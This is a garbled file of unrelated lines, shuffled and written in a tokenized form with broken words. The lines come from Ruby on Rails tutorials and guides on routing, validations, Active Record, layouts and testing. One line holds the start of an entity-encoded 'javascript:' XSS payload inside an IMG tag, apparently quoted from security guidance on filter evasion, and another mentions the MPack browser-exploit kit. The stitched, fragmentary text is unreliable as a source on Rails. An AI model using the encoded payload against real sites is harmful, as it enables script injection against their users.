▁This ▁is ▁particular ly ▁useful ▁because ▁Rails ▁comes ▁with ▁many ▁commands ▁that ▁can ▁be ▁run ▁at ▁the ▁command ▁line .
▁m attr _ accessor ▁: mechanism
▁This ▁uses ▁the ▁\ k ode { return } ▁keyword ▁to ▁return ▁immediately ▁if ▁the ▁remember ▁digest ▁is ▁\ k ode { nil }, ▁which ▁is ▁a ▁common ▁way ▁to ▁emphasize ▁that ▁the ▁rest ▁of ▁the ▁method ▁get s ▁ignore d ▁in ▁that ▁case .
▁ u ▖ name ▁= ▁" David "
▁Before , ▁we ▁ redirected ▁to ▁the ▁user ' s ▁profile ▁page ▁( Section ~\ ref { sec : successful _ signup s }), ▁but ▁that ▁doesn ' t ▁make ▁sense ▁now ▁that ▁we ' re ▁ requiring ▁account ▁activation .
▁The ▁idea ▁is ▁to ▁log ▁in , ▁visit ▁the ▁index ▁path , ▁verify ▁the ▁first ▁page ▁of ▁users ▁is ▁present , ▁and ▁then ▁confirm ▁that ▁pagination ▁is ▁present ▁on ▁the ▁page .
▁The ▁ warning ▁message ▁for ▁a ▁not - y e t - activated ▁user .
▁To ╼ create ▁it , ▁run ▁this ▁command ▁from ▁the ▁application ▁root :
▁ assert _ routing ( { ▁path : ▁' photos ', ▁method : ▁: post ▁ }, ▁ { ▁controller : ▁' photos ', ▁action : ▁' create ' ▁ })
▁ ╼\ end { code }╼╼ ▁\ subsection { A ▁problem ▁with ▁the ▁data ▁model ▁( and ▁a ▁solution )} ▁% ▁( fold )╼ ▁\ label { sec : a _ problem _ with _ the _ data _ model }╼╼
▁As ▁a ▁result , ▁the ▁admin ▁tests ▁should ▁pass :
▁To ▁understand ▁classes ▁a ▁little ▁more ▁ deep ly , ▁there ' s ▁no ▁sub st it ute ▁for ▁making ▁one ▁of ▁our ▁own .
▁At ▁this ▁point , ▁our ▁test ▁suite ▁should ▁be ▁green :
▁Of ▁course , ▁to ▁generate ▁the ▁new ▁sample ▁data ▁we ▁have ▁to ▁run ▁the ▁\ k ode { db : populate } ▁Rake ▁task :
▁<%= ▁comment ▖ body ▁%>
▁| ▁DELETE ▁| ▁ / kategorien / : id ▁| ▁categories # destroy ▁| ▁ category _ path (: id ) ▁|
▁The ▁comments ▁below ▁contain ▁some ▁suggest ion s ▁for ▁approach ing ▁the ▁\ emph { Rails ▁Tutorial } ▁depending ▁on ▁your ▁background .
▁A ▁partial ▁can ▁use ▁its ▁own ▁layout ▁file , ▁just ▁as ▁a ▁view ▁can ▁use ▁a ▁layout ▖
▁* ▁` scope d _ by _▖▖▖` ▁becomes ▁` where (▖▖▖)
▁Note ▁that ▁the ▁validator ▁will ▁be ▁initializ ed ▁* only ▁once * ▁for ▁the ▁whole ▁application ╼ life ▁c y c le , ▁and ▁not ▁on ▁each ▁validation ▁run , ▁so ▁be ▁careful ▁about ▁using ▁instance ╼ variable s ▁inside ▁it .
▁create _ account
▁Note ▁that ▁we ▁have ▁simply ▁replace d ▁\ k ode { true } ▁with ▁\ k ode { case \_ sensitive : ▁false } ; ▁Rails ▁infer s ▁in ▁this ▁case ▁that ▁\ k ode { : uniqueness } ▁should ▁be ▁\ k ode { true } .
▁As ▁in ▁previous ▁chapter s , ▁we ▁will ▁find ▁it ▁convenient ▁to ▁use ▁the ▁sample ▁data ▁Rake ▁task ▁to ▁fill ▁the ▁database ▁with ▁sample ▁relationships .
▁Other ▁directories ▁can ▁be ╼ created ▁in ▁the ▁` test ` ▁directory ▁as ▁well ▖
▁* ▁Rails ▁4▖0 ▁has ▁ deprecated ▁` ActiveRecord :: Fi x t ure s ` ▁in ▁favor ▁of ▁` ActiveRecord :: Fi x t ure S e t ` .
▁<%= ▁@ article ▖ title ▁%>
▁In ▁the ▁following ▁example ,╼ we ▁don ' t ▁want ▁names ▁and ▁ surname s ▁to ▁ begin ▁with ▁lower ▁case .
▁Layouts ▁can ▁be ▁used ▁to ▁render ▁a ▁common ▁view ▁template ▁around ▁the ▁results ▁of ▁Rails ▁controller ▁actions ▖
▁class ▁Article ▁< ▁ActiveRecord :: Base
▁Rails ▁routes ▁ / users ▁to ▁the ▁\ k ode { index } ▁action ▁in ▁the ▁Users ▁controller .
▁The ▁final ▁step ▁is ▁to ▁ migrate ▁the ▁database :
▁* ▁` config ▖ action _ dispatch ▖ default _ headers ` ▁is ▁a ▁hash ▁with ▁HTTP ▁headers ▁that ▁are ▁set ▁by ▁default ▁in ▁each ▁response ▖
▁### ▁` validates _ associated `
▁Rails ▁defaults ▁to ▁using ▁an ▁SQLite ▁database ▁when ▁creating ▁a ▁new ▁project , ▁but ▁you ▁can ▁always ▁change ▁it ▁later .
▁The ▁current ▁state ▁of ▁the ▁signup ▁page ▁\ href { http :// localhost :3000/ signup }{/ signup } ▖ ~\ href { http :// railstutorial ▖ org / images / figures / new _ signup _ page _ bootstrap - full ▖ png }{( full ▁size )}
▁And ▁now ▁if ▁you ▁ inspect ▁the ▁middleware ▁ stack , ▁you ' ll ▁find ▁that ▁` Rack :: Lock ` ▁is ╼ not ▁a ▁part ▁of ▁it .
▁As ▁with ▁arrays ▁and ▁ range s , ▁hashes ▁respond ▁to ▁the ▁\ k ode { each } ▁method .
▁In ▁this ▁section , ▁we ' ll ▁re implement ▁the ▁status ▁feed ▁in ▁a ▁way ▁that ▁ scale s ▁better ▁with ▁the ▁number ▁of ▁followed ▁users .
▁De tail ed ▁Association ▁Reference
▁create ▁mode ▁100 64 4 ▁README ▖ rdoc
▁This ▁section ▁first ▁gives ▁a ▁high - level ▁ overview ▁of ▁the ▁asset ▁pipeline , ▁and ▁then ▁shows ▁how ▁to ▁use ▁\ emph { Sass }, ▁a ▁powerful ▁tool ▁for ▁writing ▁CSS .
▁Of ▁course , ▁\ k ode { cookies } ▁isn ' t ▁\ emph { re ally } ▁a ▁hash , ▁since ▁assign ing ▁to ▁\ k ode { cookies } ▁actually ▁\ emph { save s } ▁a ▁piece ▁of ▁text ▁on ▁the ▁browser , ▁but ▁part ▁of ▁the ▁be a u t y ▁of ▁Rails ▁is ▁that ▁it ▁let s ▁you ▁ignore ▁that ▁detail ▁and ▁con c ent r ate ▁on ▁writing ▁the ▁application .
▁in ▁Listing ~\ ref { code : following _ followers _ authorization _ test } .
▁ Blacklist s ▁are ▁ never ▁complete .
▁For ▁example , ▁if ▁you ▁pass ▁a ▁ Proc ▁object , ▁the ▁block ▁you ▁give ▁the ▁ Proc ▁will ▁be ▁given ▁the ▁` controller ` ▁instance , ▁so ▁the ▁layout ▁can ▁be ▁determine d ▁base d ▁on ▁the ▁current ▁request :
▁as ▁seen ▁in ▁Listing ~\ ref { code : db _ populate } .
▁* ▁` config ▖ action _ controller ▖ request _ forgery _ protection _ token ` ▁set s ▁the ▁token ▁parameter ▁name ▁for ▁ Request For ge ry ▖
▁This ▁means ╼ that ▁you ▁need ▁to ▁require ▁them ▁yourself .
▁First , ▁where ▁are ▁the ▁parentheses ?
▁run ▁Rails ▖ application ▖ routes
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / deep _ dup ▖ rb ` .
▁The ▁`: except ` ▁option ▁specifie s ▁a ▁route ▁or ▁list ▁of ▁routes ▁that ▁Rails ▁should ▁ _ not _ ▁create :
▁ Show ing ▁a ▁different ▁user ' s ▁followers .
▁HTML ▁for ▁the ▁edit ▁form ▁defined ▁in ▁Listing ~\ ref { code : user _ edit _ view } ▁and ▁show n ▁in ▁Figure ~\ ref { fig : edit _ page } .
▁You ▁may ▁use ▁the ▁`: if `╼ option ▁when ▁you ▁want ▁to ▁specify ▁when ▁the ▁validation ▁** should ** ▁happen ▖
▁As ▁seen ▁in ▁Figure ~\ ref { fig : micropost _ length _ error }, ▁Rails ▁render s ▁\ emph { error ▁messages } ▁indicat ing ▁that ▁the ▁micropost ' s ▁content ▁is ▁too ▁long .
▁# ▁If ▁you ▁want ▁to ▁send ▁the ▁email ▁now ▁use ▁# deliver _ now
▁To ▁manually ▁define ▁an ▁action ▁inside ▁a ▁controller , ▁all ▁you ▁need ▁to ▁do ▁is ▁to ╼ define ▁a ▁new ▁method ▁inside ▁the ▁controller ▖
▁The ▁security ▁ l and s c a pe ▁ sh if t s ▁and ▁it ▁is ▁important ▁to ▁keep ▁up ▁to ▁date , ▁because ▁missing ▁a ▁new ▁ vulnerabilit y ▁can ▁be ▁ cat a str o ph ic ▖
▁ Adding ▁a ▁length ▁validation ▁for ▁the ▁\ k ode { name } ▁attribute ▖
▁Date : ▁Tue , ▁ 12 ▁Apr ▁200 5 ▁ 22 : 0 9 : 07 ▁GMT
▁I ' m ▁learning ▁Ruby ▁on ▁Rails ▁with ▁the ▁@ railstutorial !
▁In ▁this ▁section , ▁we ' ll ▁add ▁the ▁last ▁of ▁the ▁basic ▁User ▁attributes : ▁a ▁secure ▁password ▁used ▁to ▁ authenticate ▁users ▁of ▁the ▁sample ▁application .
▁Verify ing ▁that ▁the ▁test ▁suite ▁ still ▁passes ▁gives ▁us ▁confidence ▁that ▁this ▁code ▁refactoring ▁was ▁successful :
▁Tests ▁for ▁try ing ▁to ▁edit ▁as ▁the ▁wrong ▁user ▖
▁The ▁ inverse ▁of ▁` pluralize `:
▁A ▁mockup ▁of ▁the ▁signup ▁failure ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ failure _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁You ▁may ▁have ▁notice d ▁that ▁the ▁new ▁user ▁object ▁ha d ▁\ k ode { nil } ▁values ▁for ▁the ▁\ k ode { id } ▁and ▁the ▁magic ▁columns ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at } ▁attributes .
▁* ▁Rails ▁4▖0 ▁removed ▁the ▁` ActionController :: Base ▖ asset _ path ` ▁option ▖
▁CSS ▁for ▁the ▁signup ▁form .
▁The ▁account ▁activation ▁HTML ▁view .
▁ ╼ ▁=> ▁6
▁### ▁ Seri al ize d ▁attributes
▁Here ▁we ' re ▁using ▁the ▁Unix ▁\ k ode { l s } ▁command ▁to ▁list ▁the ▁contents ▁of ▁the ▁\ k ode { app / controllers / } ▁directory ▁and ▁the ▁\ k ode { rm } ▁command ▁to ▁remove ▁it .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : sessions _ helper _ authenticate }
▁The ▁new ▁password ▁resets ▁form ▁has ▁a ▁lot ▁in ▁common ▁with ▁Listing ~\ ref { code : signin _ form _ redux } ; ▁the ▁most ▁important ▁difference s ▁are ▁the ▁use ▁of ▁a ▁different ▁resource ▁and ▁URL ▁in ▁the ▁call ▁to ▁\ k ode { form \_ for } ▁and ▁the ▁omission ▁of ▁the ▁password ▁attribute .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / numeric / conversions ▖ rb ` .
▁Let ' s ▁also ▁add ▁a ▁little ▁CSS ▁( or , ▁rather , ▁ SCSS ) ▁for ▁style ▁( Listing ~\ ref { code : user _ index _ css }) .
▁Instead , ▁it ▁perform s ▁the ▁calculat ion ▁directly ▁in ▁the ▁database , ▁as k ing ▁the ▁database ▁to ▁count ▁the ▁microposts ▁with ▁the ▁given ▁\ k ode { user \_ id } ▁( an ▁operation ▁for ▁which ▁all ▁database s ▁are ▁high ly ▁optimized ) .
▁The ▁result ▁is ▁break ing ▁tests ▁for ▁application ▁code ▁that ▁ still ▁works ▁fine .
▁as ▁show n ▁in ▁Listing ~\ ref { code : rspec _ d rb } .
▁Article ▖ where ( id : ▁10 , ▁ trashed : ▁false )▖ unscope ( where : ▁: id )
▁H oo k ing ▁In to ▁an ▁Application
▁has _ many ▁Association ▁D iagram ]( images / has _ many ▖ png )
▁A nother ▁is ▁to ▁\ emph { add } ▁a ▁unique ▁user name ▁to ▁the ▁signup ▁process ▁and ▁then ▁use ▁it ▁in ▁@ replies .
▁test : mysql 2
▁# ▁root ▁' welcome # index '
▁The ▁authentication ▁machinery ▁from ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁will ▁allow ▁us ▁to ▁use ▁a ▁\ emph { before ▁filter } ▁to ▁ensure ▁that ▁this ▁is ▁the ▁case .
▁Article ▖ joins (: category , ▁: comments )
▁Using ▁the ▁\ k ode { belongs \_ to } / \ k ode { has \_ many } ▁association ▁defined ▁in ▁this ▁section , ▁Rails ▁construct s ▁the ▁methods ▁show n ▁in ▁Table ~\ ref { table : association _ methods } .
▁Note ▁that ▁we ▁have ▁explicitly ▁set ▁the ▁\ k ode { created \_ at } ▁column ▁using ▁ embedded ▁Ruby .
▁In ▁practice , ▁though , ▁it ▁is ▁a ▁ bad ▁idea ▁to ▁rely ▁on ▁this ▁fact ; ▁as ▁noted ▁at ▁\ href { http :// email ▖ about ▖ com / o d / email behind the s c en es / f / email _ case _ s en s ▖ h t m } { about ▖ com }, ▁`` S ince ▁the ▁case ▁ s en s it i v ity ▁of ▁email ▁addresses ▁can ▁create ▁a ▁lot ▁of ▁con f us ion , ▁inter o p er ability ▁problem s ▁and ▁ wide s p read ▁ head a ch es , ▁it ▁would ▁be ▁ foo li sh ▁to ▁require ▁email ▁addresses ▁to ▁be ▁type d ▁with ▁the ▁correct ▁case .
▁( For ▁reason s ▁that ▁escape ▁me , ▁this ▁is ▁some times ▁written ▁as ▁\ k ode { rake ▁ cucumber : o k } ▖)
▁A ▁logged - in ▁user ▁with ▁new ▁links ▁and ▁a ▁ drop d own ▁ menu .
▁# ▁=> ▁< option ▁value ="# { person ▖ id } "> # { person ▖ name } </ option >
▁This ▁new ▁ sanitizer ▁uses ▁[ L oo fa h ]( https :// github ▖ com / f la v or j one s / lo of a h ) ▁internally ▖
▁ attr _ internal ▁: log _ level
▁@ routes ▁= ▁ Engine ▖ routes
▁( Note ▁the ▁reuse ▁of ▁the ▁\ k ode { box \_ sizing } ▁ mixin ▁from ▁Listing ~\ ref { code : mixin _ and _ debug } ▖)
▁ nd er ▁' layouts / rails _ default ' ▁%>╼ ▁<%= ▁render ▁' layouts / shim ' ▁%>╼ ▁</ head >╼ ▁< body >╼ ▁<%= ▁render ▁' layouts / header ' ▁%>╼ ▁< div ▁class =" container "> ╼ ▁<%= ▁yield ▁%>╼ ▁<%= ▁render ▁' layouts / footer ' ▁%>╼ ▁</ div >╼ ▁</ body >╼ </ html >╼ \ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁partials ▁( end )╼╼ ▁% ▁section ▁header _ and _ menu ▁( end )╼╼ ▁\ section { Sass ▁and ▁the ▁asset ▁pipeline } ▁% ▁( fold )╼ ▁\ label { sec : sass _ and _ the _ asset _ pipeline }╼╼
▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁In ▁the ▁first ▁line ▁we ▁do ▁just ▁that ▁( remember ▁that ╼` params [: article ]` ▁contains ▁the ▁attributes ▁we ' re ▁interested ▁in )▖
▁The ▁problem ▁with ▁the ▁data ▁model ▁in ▁Figure ~\ ref { fig : na ive _ user _ has _ many _ following } ▁is ▁that ▁it ▁is ▁ ter ri b ly ▁red un d an t : ▁each ▁ row ▁contains ▁not ▁only ▁each ▁followed ▁user ' s ▁id , ▁but ▁all ▁their ▁other ▁information ▁as ▁well --- all ▁of ▁which ▁is ▁\ emph { already } ▁in ▁the ▁\ k ode { users } ▁table .
▁In ▁addition ▁to ▁support ing ▁ subdomain s , ▁Heroku ▁also ▁supports ▁custom ▁domain s .
▁X :: Y :: Z ▖ parent _ name ▁# ▁=> ▁" X :: Y "
▁Article ▖ where ( count ry : ▁count ry )
▁The ▁to p ▁ port ion ▁of ▁the ▁index ▁page ▁display s ▁the ▁users ▖
▁Then ▁the ▁line
▁validates _ with ▁G oodnessValidator
▁If ▁you ▁have ▁migrations ▁which ▁re name ▁the ▁index es , ▁they ▁are ▁no ▁longer ▁needed .
▁full ▁ regex
▁An not at ed ▁ (1) : ▁User
▁The ▁next ▁section ▁includes ▁a ▁\ k ode { header } ▁for ▁the ▁site ' s ▁( plain - text ) ▁ logo , ▁a ▁couple ▁of ▁ div is ion s ▁( using ▁the ▁\ k ode { div } ▁tag ), ▁and ▁a ▁list ▁of ▁elements ▁with ▁navigation ▁links :
▁create ▁app / views / users / edit ▖ html ▖ erb
▁With ▁that , ▁the ▁users ▁index ▁is ▁fully ▁functional , ▁with ▁all ▁tests ▁\ passing :
▁In ▁contrast , ▁both ▁actions ▁in ▁Listing ~\ ref { code : following _ followers _ action s } ▁make ▁an ▁\ emph { ex p li c it } ▁call ▁to ▁\ k ode { render }, ▁in ▁this ▁case ▁rendering ▁a ▁view ▁called ▁\ k ode { show \_ follow }, ▁which ▁we ▁must ▁create .
▁The ▁result ▁for ▁our ▁admin ▁user ▁appears ▁in ▁Figure ~\ ref { fig : index _ delete _ links _ rails _3} .
▁This ▁repeated ▁code ▁is ▁a ▁violat ion ▁of ▁the ▁important ▁`` Don ' t ▁R epeat ▁Your self '' ▁( DRY ) ▁principle ; ▁in ▁this ▁section ▁we ' ll ▁`` DRY ▁out ▁our ▁code '' ▁by ▁remov ing ▁the ▁repetition .
▁< a ▁ href =" http :// rubyonrails ▖ org "> A ▁link </ a >
▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010 ▁ 23:59:59 ▁+0000
▁use ▁Rack :: Runtime
▁App ly ing ▁the ▁Sass ▁nesting ▁and ▁variable ▁definition ▁features ▁to ▁the ▁full ▁ SCSS ▁file ▁gives ▁the ▁file ▁in ▁Listing ~\ ref { code : refactored _ scss } .
▁Now , ▁if ▁the ▁current ▁user ▁is ▁a ▁special ▁user , ▁they ' ll ▁get ▁a ▁special ▁layout ▁when ▁view ing ▁a ▁ product .
▁ --------------- ---------------- ---------------- ---------------- ----------------
▁Date : ▁Sun , ▁24 ▁A ug ▁2014 ▁20 : 28 : 45 ▁GMT
▁At ▁this ▁point , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁ Y 1 ▁= ▁: y 1
▁But ▁be ▁ w ar n ed : ▁they ▁accomplish ▁their ▁a ma z ing ▁f if te en - minute ▁ fe at ▁using ▁a ▁feature ▁called ▁\ emph { scaffold ing }, ▁which ▁relie s ▁heav ily ▁on ▁\ emph { generated ▁code }, ▁magic ally ▁created ▁by ▁the ▁Rails ▁\ k ode { generate ▁scaffold } ▁command .
▁The ▁ spacing ▁m ight ▁look ▁slightly ▁different , ▁which ▁is ▁fine ▁because ▁( as ▁noted ▁in ▁Section ~\ ref { sec : testing _ title s }) ▁HTML ▁is ▁ insensitive ▁to ▁whitespace .
▁To ▁login ▁to ▁the ▁site , ▁just ▁follow ▁this ▁link : ▁<%= ▁@ url ▁%> .
▁If ▁your ▁validator ▁is ▁complex ▁enough ▁that ▁you ▁want ▁instance ▁variables , ▁you ▁can ╼ ea s ily ▁use ▁a ▁plain ▁old ▁Ruby ▁object ▁instead :
▁ queue _ as ▁do
▁E ve ry ▁HTTP ▁response ▁from ▁your ▁Rails ▁application ▁receive s ▁the ▁following ▁default ▁security ▁headers .
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁as ▁a ▁ percentage :
▁has _ many ▁: products , ▁ dependent : ▁: destroy
▁# ▁Return s ▁the ▁full ▁title ▁on ▁a ▁per - page ▁basis .
▁` Rails :: Rack :: Debugger ` ▁is ▁p ri ma ri ly ▁useful ▁only ▁in ▁the ▁development ▁environment ▖
▁If ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁I ▁suggest ▁making ▁a ▁topic ▁branch ▁at ▁this ▁time :
▁( Note ▁that ▁there ▁is ▁no ▁need ▁to ▁include ▁a ▁parameter ▁for ~\ k ode { id } ; ▁it ▁is ▁created ▁automatically ▁by ▁Rails ▁for ▁use ▁as ▁the ▁\ emph { primary ▁key } ▁in ▁the ▁database ▖)
▁| ▁| ▁40 9 ▁| ▁: conflict ▁|
▁ Adding ▁a ▁password ▁and ▁its ▁confirmation ▖
▁# ▁ SELECT ▁count (* ) ▁AS ▁count _ all ▁FROM ▁clients ▁WHERE ▁( first _ name ▁= ▁' Ryan ')
▁following
▁The ▁custom ▁validator ▁is ▁called ▁using ▁the ╼` validates _ with ` ▁method .
▁M p ac k ▁ tries ▁to ▁install ▁ malicious ▁software ▁through ▁security ▁hole s ▁in ▁the ▁web ▁browser ▁- ▁very ▁successfully , ▁50 % ▁of ▁the ▁attacks ▁succeed .
▁The ▁result ing ▁code ▁( which ▁appears ▁as ▁a ▁comment ed - out ▁suggest ion ▁in ▁the ▁generated ▁ uploader ) ▁verifie s ▁that ▁the ▁image ▁filename ▁end s ▁with ▁a ▁valid ▁image ▁extension ▁( P N G , ▁G I F , ▁and ▁both ▁variant s ▁of ▁ J P E G ), ▁as ▁show n ▁in ▁Listing ~\ ref { code : validate _ picture _ format } .
▁The ▁goal ▁of ▁this ▁book ▁is ▁to ▁be ▁the ▁best ▁ answer ▁to ▁the ▁question , ▁`` If ▁I ▁want ▁to ▁learn ▁web ▁development ▁with ▁\ href { http :// rubyonrails ▖ org /}{ Ruby ▁on ▁Rails }, ▁where ▁should ▁I ▁start ? ''
▁( T hanks ▁to ▁reader ▁ Jeremy ▁F le is ch man ▁for ▁point ing ▁out ▁this ▁ subtle ▁issue ▖)
▁This ▁make s ▁fields _ for ▁suit able ▁for ▁specify ing ▁ additional ▁model ▁objects ▁in ▁the ▁same ▁form :
▁Running ▁\ k ode { rails ▁new } ▁( with ▁a ▁specific ▁version ▁number ) .
▁If ▁we ▁need ▁to ▁update ▁only ▁a ▁single ▁attribute , ▁using ▁the ▁ singular ▁\ k ode { update \_ attribute } ▁by pass es ▁this ▁restrict ion :
▁M any ▁website s ▁expose ▁an ▁Application ▁ Pro gr a m m er ▁Interface ▁( API ) ▁so ▁that ▁third - part y ▁applications ▁can ▁get , ▁post , ▁put , ▁and ▁delete ▁the ▁application ' s ▁resources .
▁Note ▁that ▁the ▁name ▁and ▁email ▁address ▁you ▁use ▁in ▁your ▁Git ▁configuration ▁will ▁be ▁available ▁in ▁any ▁repositories ▁you ▁make ▁public .
▁ Proc ▖ new ▁do ▁| html _ tag , ▁instance |
▁# ▁context ▁where ▁it ▁is ▁included ▁( article ▖ rb ), ▁rather ▁than ▁being
▁* ▁`: class _ name `
▁DELETE ▁ / articles / : id (▖ : format ) ▁articles # destroy
▁d ▖ end _ of _ year ▁# ▁=> ▁Fri , ▁31 ▁De c ▁2010
▁For ▁now , ▁we ▁can ▁examine ▁the ▁implications ▁of ▁the ▁user - micropost ▁association ▁by ▁using ▁the ▁\ emph { console }, ▁which ▁is ▁a ▁useful ▁tool ▁for ▁interact ing ▁with ▁Rails ▁applications .
▁Note ▁that ▁Listing ~\ ref { code : demo _ gemfile _ sqlite _ version _ redux } ▁is ▁identical ▁to ▁Listing ~\ ref { code : gemfile _ pg _ gem } .
▁A ▁\ k ode { Gemfile } ▁with ▁added ▁gems .
▁ yesterday
▁B E G IN
▁ Server - S ide ▁ Concern s
▁It ' s ╼ different ▁from ▁the ▁` ActiveRecord :: Base # invalid ?` ▁method ▁explained ▁above ▁because ╼ it ▁doesn ' t ▁verify ▁the ▁ validity ▁of ▁the ▁object ▁as ▁a ▁whole ▖
▁The ▁code ▁in ▁Listing ~\ ref { code : email _ downcase } ▁passes ▁a ▁block ▁to ▁the ▁\ k ode { before \_ save } ▁callback ▁and ▁set s ▁the ▁user ' s ▁email ▁address ▁to ▁a ▁lower - case ▁version ▁of ▁its ▁current ▁value ▁using ▁the ▁\ k ode { downcase } ▁string ▁method .
▁ dasherize ? ▁?
▁When ▁writing ▁documentation ▁for ▁Rails , ▁it ' s ▁important ▁to ▁understand ▁the ▁difference ▁between ▁public ▁user - f ac ing ▁API ▁ v s ▁ internal ▁API .
▁* ▁` ActionDispatch :: ShowExceptions ` ▁ rescue s ▁any ▁exception ▁returned ▁by ▁the ▁application ▁and ▁render s ▁nice ▁exception ▁pages ▁if ▁the ▁request ▁is ▁local ▁or ▁if ▁` config ▖ con side r _ all _ request s _ local ` ▁is ▁set ▁to ▁` true ` ▖
▁layout ▁' mailer '
▁In ▁the ▁course ▁of ▁developing ▁the ▁ core ▁sample ▁application , ▁we ' ve ▁now ▁ en counter ed ▁four ▁resources --- users , ▁sessions , ▁account ▁ activations , ▁and ▁password ▁resets --- but ▁only ▁the ▁first ▁of ▁these ▁is ▁back ed ▁by ▁an ▁Active ▁Record ▁model ▁with ▁a ▁table ▁in ▁the ▁database .
▁We ▁would ▁generate ▁some ▁HTML ▁like ▁this :
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : login _ form }, ▁the ▁login ▁form ▁appears ▁as ▁in ▁Figure ~\ ref { fig : login _ form } .
▁if ▁@ article ▖ update ( article _ params )
▁We ▁need ▁to ▁select ▁all ▁the ▁microposts ▁from ▁the ▁\ k ode { microposts } ▁table ▁with ▁id s ▁corresponding ▁to ▁the ▁users ▁being ▁followed ▁by ▁a ▁given ▁user ▁( or ▁the ▁user ▁itself ) .
▁S p end ▁a ▁couple ▁of ▁hours ▁ play ing ▁with ▁\ href { http :// www ▖ rubular ▖ com /}{ Rubular } .
▁this ▁would ▁output ▁the ▁following :
▁The ▁Static ▁Pages ▁controller ▁generation ▁in ▁Listing ~\ ref { code : generating _ pages } ▁automatically ▁update s ▁the ▁routes ▁file ▁(\ k ode { config / routes ▖ rb }), ▁which ▁we ▁saw ▁brief ly ▁in ▁Section ~\ ref { sec : hello _ world } .
▁< ! [ end if ]
▁config ▖ to _ prepare ▁do
▁` years _ since ` ▁move s ▁forward ▁in ▁time :
▁ Each ▁request ╼ for ▁a ▁comment ▁has ▁to ▁keep ▁ track ▁of ▁the ▁article ▁to ▁which ▁the ▁comment ▁is ▁attached ,╼ th us ▁the ▁initial ▁call ▁to ▁the ▁` find ` ▁method ▁of ▁the ▁` Article ` ▁model ▁to ▁get ▁the ╼ article ▁in ▁question .
▁* ▁` ActionDispatch :: Re m o te I p ` ▁check s ▁for ▁ IP ▁ s po of ing ▁attacks ▁and ▁get s ▁valid ▁` client _ ip ` ▁from ▁request ▁headers ▖
▁ { a : ▁1 } ▖ assert _ valid _ keys (" a ") ▁# ▁ ArgumentError
▁respond _ with ▁@ user
▁To ▁install ▁it , ▁we ▁run ▁\ k ode { bundle ▁install } ▁with ▁a ▁special ▁flag :
▁| ▁| ▁4 08 ▁| ▁: request _ time out ▁|
▁------------ --------------- ----------------
▁d ▖ beginning _ of _ week ▁# ▁=> ▁Mon , ▁0 3 ▁May ▁2010
▁If ▁it ▁contains ▁extra ▁paths , ▁then ▁an ▁exception ▁will ▁be ▁raised .
▁Listing ~\ ref { code : sidebar _ css } ▁includes ▁the ▁\ k ode { ▖ gravatar \_ edit } ▁class , ▁which ▁we ' ll ▁put ▁to ▁work ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } .
▁To ▁\ emph { m u t ate } ▁the ▁array , ▁use ▁the ▁corresponding ▁`` bang '' ▁methods ▁( so - called ▁because ▁the ▁excl a m ation ▁point ▁is ▁usually ▁ pronoun c ed ▁`` bang '' ▁in ▁this ▁context ) :
▁* ▁` assert _ routing `
▁The ▁` shallow ` ▁method ▁of ▁the ▁ DSL ▁creates ▁a ▁scope ▁inside ▁of ▁which ▁every ▁nesting ▁is ▁ shallow ▖
▁It ▁doesn ' t ▁make ▁sense ▁for ▁the ▁host ▁app ▁to ▁include ╼` " blorgh / admin ▖ css " ` ▁in ▁its ▁stylesheets ▖
▁Using ▁\ k ode { has \_ many } ▁and ▁\ k ode { has \_ many ▁: through } ▁with ▁properly ▁ ch o s en ▁class ▁names ▁and ▁foreign ▁keys , ▁we ▁can ▁model ▁both ▁active ▁( following ) ▁and ▁ passive ▁( be ing ▁followed ) ▁relationships .
▁When ▁enabled ,╼ this ▁passes ▁responsib i l ity ▁for ▁ serv ing ▁the ▁file ▁to ▁the ▁web ▁server , ▁which ▁is ╼ fast er ▖
▁create ▁test / controllers / blorgh / articles _ controller _ test ▖ rb
▁"#{ title } "
▁ conflict ▁config / environment ▖ rb
▁ J o in ▁ Fi lt er : ▁( articles ▖ user _ id ▁= ▁users ▖ id )
▁# ▁< id ▁type =" integer "> 4 3 5 6 </ id >
▁A ▁user ▁\ k ode { has \_ many } ▁relationships , ▁and --- since ▁relationships ▁involve ▁\ emph { two } ▁users --- a ▁relationship ▁\ k ode { belongs \_ to } ▁both ▁a ▁ follower ▁and ▁a ▁followed ▁user .
▁< IM G ▁S R C = & # 1 06 ; & # 9 7 ; & # 1 18 ; & # 9 7 ; & # 1 15 ; & # 99 ; & # 1 14 ; & # 10 5 ; & # 1 12 ; & # 1 16 ; & # 58 ; & # 9 7 ;
▁has _ one ▁: account , ▁ inverse _ of : ▁: supplier
▁NOTE : ▁The ▁name ▁of ▁the ▁other ▁model ▁is ▁ pluralize d ▁when ▁declar ing ▁a ▁` has _ many ` ▁association .
▁#### ▁S ub set ▁Conditions
▁The ▁ core ▁method ▁of ▁this ▁helper , ▁form _ for , ▁gives ▁you ▁the ▁ability ▁to ▁create ▁a ▁form ▁for ▁a ▁model ▁instance ; ▁for ▁example , ▁let ' s ▁say ▁that ▁you ▁have ▁a ▁model ▁Person ▁and ▁want ▁to ▁create ▁a ▁new ▁instance ▁of ▁it :
▁Because ▁of ▁the ▁many ▁methods ▁supplied ▁by ▁Active ▁Record , ▁we ▁won ' t ▁ever ▁need ▁raw ▁SQL ▁in ▁this ▁book , ▁and ▁I ' ll ▁omit ▁discussion ▁of ▁the ▁SQL ▁commands ▁from ▁now ▁on .
▁as ▁seen ▁in ▁Listing ~\ ref { code : help _ page _ passing } .
